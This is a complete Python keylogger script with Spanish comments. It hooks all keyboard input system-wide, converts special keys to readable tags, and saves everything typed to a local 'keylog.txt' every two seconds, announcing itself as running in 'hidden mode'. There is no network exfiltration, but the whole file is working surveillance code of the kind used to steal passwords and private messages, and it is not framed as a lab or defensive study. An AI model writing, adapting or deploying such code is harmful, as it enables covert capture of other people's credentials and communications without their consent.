import os # Funciones del sistema operativo
import sys # Funciones del sistema
import time # Funciones de tiempo y pausas
import datetime # Fecha y hora para encabezado
import threading # Hilos para ejecución paralela
import keyboard # Captura global de eventos de teclado

# VARIABLES GLOBALES
nombre_archivo = "keylog.txt" # Nombre del archivo de registro
texto_capturado = "" # Almacena lo capturado en memoria antes de guardar en archivo
tiempo_ultima_escritura = 0 # Marca de tiempo de la última escritura en archivo
intervalo_guardado = 2.0 # Intervalo en segundos para guardar automáticamente
escribiendo_linea = True # Controla si se está escribiendo en la línea actual

# FUNCIONES
# Escribe el contenido capturado al archivo
def escribir_archivo():
    global texto_capturado
    global tiempo_ultima_escritura

    # Verificar si hay texto para guardar
    if texto_capturado:
        try:
            with open(nombre_archivo, "a", encoding = "utf-8") as archivo:
                archivo.write(texto_capturado)
                
            texto_capturado = "" # Vaciar buffer después de escribir
            tiempo_ultima_escritura = time.time() # Actualizar marca de tiempo
        except Exception as e:
            pass # Ignorar errores de escritura silenciosamente

# Actualiza texto en archivo según intervalo automático
def verificar_guardado_periodico():
    global tiempo_ultima_escritura
    
    while escribiendo_linea:
        tiempo_actual = time.time()
        
        # Verificar si ha pasado el intervalo de guardado
        if (tiempo_actual - tiempo_ultima_escritura) >= intervalo_guardado:
            escribir_archivo()
        
        time.sleep(0.1) # Esperar breve antes de revisar nuevamente

# Gestiona evento de tecla presionada
def manejar_tecla_presionada(evento):
    global texto_capturado
    
    # Procesar teclas especiales y convertirlas a formato legible
    if evento.event_type == "down":
        if evento.name == "space":
            texto_capturado += " "
        elif evento.name == "enter":
            texto_capturado += "\n"
        elif evento.name == "tab":
            texto_capturado += "\t"
        elif evento.name == "backspace":
            if texto_capturado:
                texto_capturado = texto_capturado[:-1] # Eliminar último carácter
        elif len(evento.name) > 1:
            # Tecla especial: agregar entre corchetes
            texto_capturado += f"[{evento.name.upper()}]"
        else:
            texto_capturado += evento.name # Tecla normal

# Muestra estado actual del registro
def mostrar_estado():
    print("Recording keys (hidden mode)")
    print(f"Output file: {os.path.abspath(nombre_archivo)}")
    print("Press ESC to stop\n")

# Inicializa archivo con encabezado si no existe
def inicializar_archivo():
    if not os.path.exists(nombre_archivo):
        marca_tiempo = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        with open(nombre_archivo, "w", encoding = "utf-8") as archivo:
            archivo.write(f"--- Keylog started at {marca_tiempo} ---\n\n")

# Configura captura de teclas global
def configurar_captura():
    # Configurar hook global para capturar todas las teclas
    keyboard.hook(manejar_tecla_presionada)
    
    # Esperar específicamente por tecla ESC para detener
    keyboard.wait("esc")

# Limpia recursos y finaliza programa
def finalizar_programa():
    global escribiendo_linea
    
    escribiendo_linea = False # Detener hilo de guardado periódico
    
    # Escribir cualquier texto pendiente
    escribir_archivo()
    
    # Agregar marca de fin al archivo
    marca_tiempo = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    try:
        with open(nombre_archivo, "a", encoding = "utf-8") as archivo:
            archivo.write(f"\n--- Keylog stopped at {marca_tiempo} ---\n")
    except Exception as e:
        pass
    
    print("\nRecording stopped")
    print("File saved successfully")
    
    os._exit(0) # Terminar proceso completamente

# PUNTO DE PARTIDA
try:
    # Inicializar archivo de registro
    inicializar_archivo()
    
    # Mostrar información de estado
    mostrar_estado()
    
    # Iniciar hilo para guardado periódico automático
    hilo_guardado = threading.Thread(target = verificar_guardado_periodico, daemon = True)
    
    hilo_guardado.start()
    
    # Iniciar captura de teclas (bloqueante hasta presionar ESC)
    configurar_captura()
    
except KeyboardInterrupt:
    pass # Capturar interrupción manual
except Exception as e:
    print(f"Error: {e}")
finally:
    # Asegurar finalización limpia
    finalizar_programa()
